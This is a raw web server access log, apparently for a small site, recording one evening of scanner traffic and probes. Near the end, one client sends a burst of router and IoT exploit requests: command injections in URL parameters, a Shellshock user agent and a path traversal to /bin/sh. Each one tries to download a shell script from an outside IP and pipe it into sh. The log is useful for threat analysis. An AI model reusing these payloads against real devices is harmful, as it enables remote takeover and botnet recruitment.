176.97.210.9 - - [01/Oct/2025:18:01:48 +0000] "CONNECT postman-echo.com:443 HTTP/1.1" 400 157 "-" "-" "-"
43.166.128.187 - - [01/Oct/2025:18:06:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
43.166.128.187 - - [01/Oct/2025:18:06:03 +0000] "GET / HTTP/1.1" 200 4004 "http://fantcric.fun" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
104.23.221.146 - - [01/Oct/2025:18:08:24 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:18:08:24 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
20.46.235.164 - - [01/Oct/2025:18:08:41 +0000] "MGLNDD_45.135.59.210_443" 400 157 "-" "-" "-"
104.23.221.146 - - [01/Oct/2025:18:08:59 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:18:11:41 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:18:11:41 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.71.172.149 - - [01/Oct/2025:18:11:51 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
195.178.110.15 - - [01/Oct/2025:18:12:24 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xB0\xE5\xAD\xEF\xD1\x0E\xFD\xB7\xFAA\x93\xDE\xC1\x15\x19\xC9\xD6QX\xCD\xD5\x87y$U\xC1" 400 157 "-" "-" "-"
195.178.110.15 - - [01/Oct/2025:18:12:24 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.15 - - [01/Oct/2025:18:12:24 +0000] "GET / HTTP/1.1" 301 169 "-" "l9tcpid/v1.1.0" "-"
79.124.58.198 - - [01/Oct/2025:18:13:14 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:18:13:20 +0000] "GET / HTTP/1.1" 200 4004 "http://45.135.59.210:80" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
102.129.235.141 - - [01/Oct/2025:18:14:28 +0000] "\x12\x01\x00&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\xFF" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:29 +0000] "\x16\x03\x01\x00O\x01\x00\x00K\x03\x03e\xC2\xE9\xA7r.jd\x11\xA37\xEC\xD6\xD3" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:30 +0000] "GET / HTTP/1.1" 301 169 "-" "WanScannerBot/1.0" "-"
102.129.235.141 - - [01/Oct/2025:18:14:31 +0000] "SSH-2.0-WanScannerBot" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:32 +0000] "\x03\x00\x00&!\xE0\x00\x00\xFE\xCA\x00Cookie: mstshash=" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:33 +0000] "\x10\x0F\x00\x04MQTT\x04\x00\x00" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:33 +0000] "AMQP\x00\x00\x09\x01" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:34 +0000] "\x00\x00\x00%\xFFSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:34 +0000] "OPTIONS / RTSP/1.0" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:35 +0000] "\x00\x00\x00\x08\x04\xD2\x16/" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:36 +0000] "\x01\x00\x00\x00" 400 157 "-" "-" "-"
102.129.235.141 - - [01/Oct/2025:18:14:36 +0000] "GET / HTTP/1.1" 301 169 "-" "WanScannerBot/1.1" "-"
204.76.203.219 - - [01/Oct/2025:18:18:04 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
37.60.141.156 - - [01/Oct/2025:18:21:37 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
199.45.155.103 - - [01/Oct/2025:18:22:19 +0000] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.155.103 - - [01/Oct/2025:18:22:48 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 22 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
79.124.58.198 - - [01/Oct/2025:18:24:55 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:18:25:00 +0000] "GET / HTTP/1.1" 200 4004 "http://45.135.59.210:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
23.27.145.154 - - [01/Oct/2025:18:29:08 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0" "-"
104.23.221.146 - - [01/Oct/2025:18:33:11 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
203.109.53.85 - - [01/Oct/2025:18:33:54 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
34.76.117.34 - - [01/Oct/2025:18:33:55 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
203.109.53.85 - - [01/Oct/2025:18:34:02 +0000] "GET /cmd_sco HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
34.76.117.34 - - [01/Oct/2025:18:34:10 +0000] "GET /cmd_sco HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
104.23.221.146 - - [01/Oct/2025:18:34:25 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:18:34:25 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:18:34:25 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:18:34:45 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:18:34:45 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
34.79.215.23 - - [01/Oct/2025:18:40:35 +0000] "GET / HTTP/1.1" 404 22 "-" "python-requests/2.32.5" "-"
195.178.110.160 - - [01/Oct/2025:18:46:31 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.160 - - [01/Oct/2025:18:46:31 +0000] "GET / HTTP/1.1" 404 22 "-" "l9tcpid/v1.1.0" "-"
199.45.155.97 - - [01/Oct/2025:18:46:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.155.97 - - [01/Oct/2025:18:46:57 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
199.45.155.97 - - [01/Oct/2025:18:47:01 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.155.97 - - [01/Oct/2025:18:47:03 +0000] "GET /favicon.ico HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
199.45.155.97 - - [01/Oct/2025:18:47:25 +0000] "GET /favicon.ico HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
79.124.58.198 - - [01/Oct/2025:18:49:04 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:18:49:09 +0000] "GET /actuator/gateway/routes HTTP/1.1" 200 4004 "http://45.135.59.210:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.23.223.18 - - [01/Oct/2025:18:51:23 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:18:51:43 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
23.27.145.111 - - [01/Oct/2025:18:53:22 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
104.23.221.147 - - [01/Oct/2025:18:53:51 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:18:53:51 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.162 - - [01/Oct/2025:18:55:00 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.162 - - [01/Oct/2025:18:55:00 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
206.168.34.112 - - [01/Oct/2025:18:56:36 +0000] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
206.168.34.112 - - [01/Oct/2025:18:57:41 +0000] "GET /sitemap.xml HTTP/1.1" 404 22 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
134.209.195.85 - - [01/Oct/2025:19:02:28 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" "-"
134.209.195.85 - - [01/Oct/2025:19:02:28 +0000] "GET /favicon.ico HTTP/1.1" 301 169 "http://api.fantcric.fun/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" "-"
134.209.195.85 - - [01/Oct/2025:19:02:28 +0000] "GET / HTTP/1.1" 404 22 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" "-"
134.209.195.85 - - [01/Oct/2025:19:02:28 +0000] "GET /favicon.ico HTTP/1.1" 404 22 "https://api.fantcric.fun/" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0" "-"
37.60.141.156 - - [01/Oct/2025:19:09:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 301 169 "-" "-" "-"
37.60.141.156 - - [01/Oct/2025:19:09:05 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 15847 "http://45.135.59.210:80/cgi-bin/luci/;stok=/locale" "-" "-"
104.23.217.163 - - [01/Oct/2025:19:13:32 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.163 - - [01/Oct/2025:19:13:32 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.162 - - [01/Oct/2025:19:14:24 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.162 - - [01/Oct/2025:19:14:24 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.163 - - [01/Oct/2025:19:15:12 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.162 - - [01/Oct/2025:19:16:22 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
79.124.58.198 - - [01/Oct/2025:19:25:33 +0000] "GET /geoserver HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:19:25:38 +0000] "GET /geoserver HTTP/1.1" 200 4004 "http://45.135.59.210:80/geoserver" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.23.221.146 - - [01/Oct/2025:19:35:08 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:19:35:08 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:19:35:18 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:19:35:19 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:19:36:03 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
204.76.203.212 - - [01/Oct/2025:19:37:06 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
104.23.221.146 - - [01/Oct/2025:19:38:36 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
3.89.90.123 - - [01/Oct/2025:19:41:22 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)" "-"
3.89.90.123 - - [01/Oct/2025:19:41:22 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Flipboard/4.2.142" "-"
104.23.221.147 - - [01/Oct/2025:19:56:25 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:19:56:25 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.70.248.130 - - [01/Oct/2025:19:56:40 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.70.248.131 - - [01/Oct/2025:19:56:40 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:19:57:39 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:19:59:10 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
45.88.186.85 - - [01/Oct/2025:20:16:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:38 +0000] "GET /goform/webRead/open/?path=%7Cwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wtf.sh%7Csh HTTP/1.0" 301 0 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:39 +0000] "POST /apply_sec.cgi HTTP/1.1" 301 169 "http://45.135.59.210/login_pic.asp" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:39 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - ffadmin [01/Oct/2025:20:16:39 +0000] "POST /apply.cgi HTTP/1.1" 301 169 "http://45.135.59.210/apply.cgi" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - ffadmin [01/Oct/2025:20:16:39 +0000] "POST /apply.cgi HTTP/1.1" 301 0 "http://45.135.59.210/apply.cgi" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - root [01/Oct/2025:20:16:39 +0000] "POST /dvr/cmd HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:39 +0000] "GET / HTTP/1.1" 301 169 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\x22& #Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - admin [01/Oct/2025:20:16:39 +0000] "POST /goform/SystemCommand HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:39 +0000] "GET /cgi-bin/shortcut_telnet.cgi?wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.wyu.sh%7Csh%26 HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:39 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.ush.sh%7Csh%26&curpath=%2F&currentsetting.htm=1 HTTP/1.1" 301 0 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - admin [01/Oct/2025:20:16:40 +0000] "POST /cgi-bin/cgi_main.cgi HTTP/1.1" 301 169 "http://45.135.59.210/cfg_system_time.htm" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - admin [01/Oct/2025:20:16:40 +0000] "POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4= HTTP/1.1" 301 169 "http://45.135.59.210/cgi-bin/server/server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - admin [01/Oct/2025:20:16:40 +0000] "POST /goform/mp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "POST /cgi-bin/system_mgr.cgi? HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.djc.sh%7Csh%3B%27 HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "POST /goform/Mail_Test HTTP/1.0" 301 0 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "GET /cgi-bin/;wget${IFS}-qO-${IFS}http://74.194.191.52/rondo.sbx.sh|sh&echo${IFS} HTTP/1.0" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "GET /HNAP1/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.ebj.sh%7Csh%26echo%20 HTTP/1.0" 301 0 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:40 +0000] "GET /setup.cgi?todo=funjsq_login&funjsq_access_token=12345|busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.fep.sh%7Csh%0A&test=11%00currentsetting.htm HTTP/1.1" 301 169 "-" "Mozilla/5.0 (makenoise@tutanota.de)" "-"
45.88.186.85 - - [01/Oct/2025:20:16:41 +0000] "POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
104.23.221.146 - - [01/Oct/2025:20:16:49 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
37.60.141.156 - - [01/Oct/2025:20:17:02 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
104.23.221.146 - - [01/Oct/2025:20:18:28 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
